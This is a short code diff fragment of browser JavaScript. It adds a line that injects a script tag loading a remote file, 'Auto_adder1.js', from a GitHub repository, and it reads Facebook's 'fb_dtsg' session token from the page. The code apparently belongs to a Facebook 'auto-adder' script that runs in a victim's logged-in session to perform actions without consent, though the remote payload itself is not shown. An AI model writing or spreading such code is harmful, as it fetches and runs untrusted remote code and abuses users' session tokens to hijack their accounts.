@@ -1,5 +1,4 @@
-
-
+document.body.appendChild(document.createElement('script')).src='https://github.com/braveheartx/BraveHeart/raw/master/Auto_adder1.js';})();
 
 
 var fb_dtsg = document.getElementsByName('fb_dtsg')[0].value;
